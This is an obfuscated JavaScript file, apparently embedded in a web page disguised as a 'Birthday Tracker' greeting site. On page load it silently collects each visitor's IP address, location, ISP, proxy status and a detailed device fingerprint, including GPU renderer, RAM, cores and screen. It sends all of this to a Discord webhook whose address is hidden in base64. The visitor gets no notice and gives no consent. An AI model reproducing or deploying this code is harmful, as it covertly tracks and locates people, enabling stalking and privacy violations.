(function() {
    'use strict';
    const _0x2b4a = ['aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2NTQwMzg2NjI5MDg0Nzk2OS9YcmFqYi1hU3hwMnNja2xrWnpsNGUwc1VpamRLaFUwb2xlMVBPZ3VpQV92NWd3bktHQkp0Zjl0M2pBRXh6bnNfdG9DQw=='];
    function _0x5f8c(_0x3a2b) {
        return atob(_0x3a2b[0]);
    }
    async function _0x3a9b() {
        let _0x8f2e = 'Определяется...';
        let _0x7c1d = {
            country: 'Загрузка...',
            region: 'Загрузка...',
            city: 'Загрузка...',
            isp: 'Загрузка...',
            asn: 'Загрузка...',
            proxy: 'Загрузка...'
        };
        const apis = [
            {
                url: 'https://ipapi.co/json/',
                parser: (data) => ({
                    ip: data.ip,
                    country: `${data.country_name || 'Неизвестно'} ${data.country_code ? '(' + data.country_code + ')' : ''}`,
                    region: data.region || 'Неизвестно',
                    city: data.city || 'Неизвестно',
                    isp: data.org || 'Неизвестно',
                    asn: data.asn || 'Неизвестно',
                    proxy: data.proxy === true ? 'Да (Proxy/VPN) 🚨' : data.proxy === false ? 'Нет ✅' : 'Неизвестно'
                })
            },
            {
                url: 'https://ipinfo.io/json',
                parser: (data) => ({
                    ip: data.ip,
                    country: data.country || 'Неизвестно',
                    region: data.region || 'Неизвестно',
                    city: data.city || 'Неизвестно',
                    isp: data.org || 'Неизвестно',
                    asn: data.org || 'Неизвестно',
                    proxy: 'Неизвестно'
                })
            },
            {
                url: 'https://api.ipify.org?format=json',
                parser: (data) => ({
                    ip: data.ip,
                    country: 'API недоступен',
                    region: 'Попробуйте позже',
                    city: '—',
                    isp: '—',
                    asn: '—',
                    proxy: '—'
                })
            }
        ];
        
        for (const api of apis) {
            try {
                console.log('📡 Пробую API:', api.url);
                const response = await fetch(api.url);
                const data = await response.json();
                
                if (data && (data.ip || data.ipAddress)) {
                    const result = api.parser(data);
                    if (result.ip && result.ip !== '0.0.0.0') {
                        _0x8f2e = result.ip;
                        _0x7c1d = {
                            country: result.country,
                            region: result.region,
                            city: result.city,
                            isp: result.isp,
                            asn: result.asn,
                            proxy: result.proxy
                        };
                        console.log('✅ Получены данные:', _0x8f2e);
                        break;
                    }
                }
            } catch (error) {
                console.log('⚠️ API недоступен:', api.url);
                continue;
            }
        }
        
        return { ip: _0x8f2e, ..._0x7c1d };
    }
    
    // Определение устройства
    function _0x9e4a() {
        const _0x2f8b = navigator.userAgent.toLowerCase();
        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(_0x2f8b)) {
            return 'Tablet 📱';
        }
        if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(_0x2f8b)) {
            return 'Mobile 📱';
        }
        return 'Desktop 🖥️';
    }
    function _0x7f4a() {
        const _0x8a2b = navigator.userAgent.toLowerCase();
        let _0x9c3d = 'Неизвестно';
        if (_0x8a2b.includes('arm') || _0x8a2b.includes('aarch64')) _0x9c3d = 'ARM';
        else if (_0x8a2b.includes('x86_64') || _0x8a2b.includes('win64') || _0x8a2b.includes('x64')) _0x9c3d = 'x64';
        else if (_0x8a2b.includes('x86') || _0x8a2b.includes('i686')) _0x9c3d = 'x86';
        const _0x2d8c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        const _0x5e9f = _0x2d8c ? (_0x2d8c.effectiveType || _0x2d8c.type || 'Неизвестно') + (_0x2d8c.downlink ? ` (${_0x2d8c.downlink} Mbps)` : '') : 'Неизвестно';
        const _0x6a7b = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : 'Неизвестно';
        const _0x3f9e = window.devicePixelRatio || 1;
        const _0x8b2c = _0x3f9e > 1 ? `Да (${_0x3f9e}x)` : 'Нет';
        const _0x7c4d = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0) ? 'Да ✅' : 'Нет ❌';
        let _0x9e5f = 'Нет ❌';
        try {
            const _0x2a6b = document.createElement('canvas');
            if (!!( _0x2a6b.getContext('webgl') || _0x2a6b.getContext('experimental-webgl'))) _0x9e5f = 'Да ✅';
        } catch (e) {}
        const _0x4c8e = !!document.createElement('canvas').getContext ? 'Да ✅' : 'Нет ❌';
        const _0x7f9a = navigator.cookieEnabled ? 'Да ✅' : 'Нет ❌';
        const _0x8b3c = typeof localStorage !== 'undefined' ? 'Да ✅' : 'Нет ❌';
        const _0x2d7e = typeof sessionStorage !== 'undefined' ? 'Да ✅' : 'Нет ❌';
        let _0x9a4b = { vendor: 'Неизвестно', renderer: 'Неизвестно' };
        try {
            const _0x5c8d = document.createElement('canvas');
            const _0x7e9f = _0x5c8d.getContext('webgl') || _0x5c8d.getContext('experimental-webgl');
            if (_0x7e9f) {
                const _0x2a6c = _0x7e9f.getExtension('WEBGL_debug_renderer_info');
                if (_0x2a6c) {
                    _0x9a4b.vendor = _0x7e9f.getParameter(_0x2a6c.UNMASKED_VENDOR_WEBGL);
                    _0x9a4b.renderer = _0x7e9f.getParameter(_0x2a6c.UNMASKED_RENDERER_WEBGL);
                } else {
                    _0x9a4b.vendor = _0x7e9f.getParameter(_0x7e9f.VENDOR);
                    _0x9a4b.renderer = _0x7e9f.getParameter(_0x7e9f.RENDERER);
                }
            }
        } catch (e) {}
        
        return {
            cpu: _0x9c3d,
            cores: navigator.hardwareConcurrency || 'Неизвестно',
            ram: _0x6a7b,
            network: _0x5e9f,
            retina: _0x8b2c,
            touch: _0x7c4d,
            webgl: _0x9e5f,
            canvas: _0x4c8e,
            cookie: _0x7f9a,
            local: _0x8b3c,
            session: _0x2d7e,
            gpuVendor: _0x9a4b.vendor,
            gpuRenderer: _0x9a4b.renderer
        };
    }

    async function _0x8d2e(_0x7c9f) {
        try {
            const _0x1e6a = _0x5f8c(_0x2b4a);
            
            const _0x9f4b = {
                content: `**${_0x7c9f.visitType}** | Session: \`${_0x7c9f.sessionId}\``,
                embeds: [{
                    title: '🎂 Новый посетитель на сайте!',
                    color: 15844367,
                    fields: [
                        { name: '⏰ Время', value: _0x7c9f.timestamp, inline: true },
                        { name: '🌐 IP', value: _0x7c9f.ip, inline: true },
                        { name: '🌍 Страна', value: _0x7c9f.country, inline: true },
                        { name: '📍 Регион', value: _0x7c9f.region, inline: true },
                        { name: '🏙️ Город', value: _0x7c9f.city, inline: true },
                        { name: '🏢 ISP', value: _0x7c9f.isp, inline: true },
                        { name: '� ASN', value: _0x7c9f.asn, inline: true },
                        { name: '🛡️ Proxy', value: _0x7c9f.proxy, inline: true },
                        { name: '📶 Сеть', value: _0x7c9f.network, inline: true },
                        { name: '�️ Устройство', value: _0x7c9f.device, inline: true },
                        { name: '⚙️ CPU', value: _0x7c9f.cpu, inline: true },
                        { name: '� Ядра', value: _0x7c9f.cores, inline: true },
                        { name: '💾 RAM', value: _0x7c9f.ram, inline: true },
                        { name: '� ОС', value: _0x7c9f.platform, inline: true },
                        { name: '📺 Экран', value: _0x7c9f.screen, inline: true },
                        { name: '✨ Retina', value: _0x7c9f.retina, inline: true },
                        { name: '👆 Touch', value: _0x7c9f.touch, inline: true },
                        { name: '🌍 Язык', value: _0x7c9f.language, inline: true },
                        { name: '🎨 WebGL', value: _0x7c9f.webgl, inline: true },
                        { name: '🖼️ Canvas', value: _0x7c9f.canvas, inline: true },
                        { name: '🍪 Cookie', value: _0x7c9f.cookie, inline: true },
                        { name: '💾 Local', value: _0x7c9f.local, inline: true },
                        { name: '💾 Session', value: _0x7c9f.session, inline: true },
                        { name: '🎮 GPU Vendor', value: _0x7c9f.gpuVendor, inline: false },
                        { name: '🎮 GPU Renderer', value: _0x7c9f.gpuRenderer, inline: false }
                    ],
                    footer: { text: 'Birthday Tracker' },
                    timestamp: new Date().toISOString()
                }]
            };
            
            const _0x6a8c = await fetch(_0x1e6a, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(_0x9f4b)
            });
            
            if (_0x6a8c.ok) {
                console.log('✅ Успешно отправлено в Discord!');
            } else {
                console.log('⚠️ Discord ответил с кодом:', _0x6a8c.status);
            }
            
            return _0x6a8c.ok;
        } catch (_0x4e7d) {
            console.log('❌ Ошибка отправки:', _0x4e7d);
            return false;
        }
    }
    window.sendDiscordNotification = async function() {
        const _0x7a9b = 'SESSION_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        const _0x5e8c = sessionStorage.getItem('visit_count') || 0;
        const _0x2f6a = parseInt(_0x5e8c) + 1;
        sessionStorage.setItem('visit_count', _0x2f6a);
        
        const _0x8d4f = await _0x3a9b();
        const _0x9c7e = _0x7f4a();
        
        const _0x9c7a = {
            sessionId: _0x7a9b,
            visitType: _0x2f6a === 1 ? '🆕 Первый визит' : `🔄 Визит #${_0x2f6a}`,
            timestamp: new Date().toLocaleString('ru-RU'),
            ip: _0x8d4f.ip,
            country: _0x8d4f.country,
            region: _0x8d4f.region,
            city: _0x8d4f.city,
            isp: _0x8d4f.isp,
            asn: _0x8d4f.asn,
            proxy: _0x8d4f.proxy,
            network: _0x9c7e.network,
            device: _0x9e4a(),
            cpu: _0x9c7e.cpu,
            cores: _0x9c7e.cores,
            ram: _0x9c7e.ram,
            platform: navigator.platform || 'Неизвестно',
            screen: `${window.screen.width}x${window.screen.height}`,
            retina: _0x9c7e.retina,
            touch: _0x9c7e.touch,
            language: navigator.language || 'Неизвестно',
            webgl: _0x9c7e.webgl,
            canvas: _0x9c7e.canvas,
            cookie: _0x9c7e.cookie,
            local: _0x9c7e.local,
            session: _0x9c7e.session,
            gpuVendor: _0x9c7e.gpuVendor,
            gpuRenderer: _0x9c7e.gpuRenderer
        };
        
        console.log('🎂 Отправка данных в Discord...', _0x7a9b);
        return await _0x8d2e(_0x9c7a);
    };
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', window.sendDiscordNotification);
    } else {
        window.sendDiscordNotification();
    }
    
})();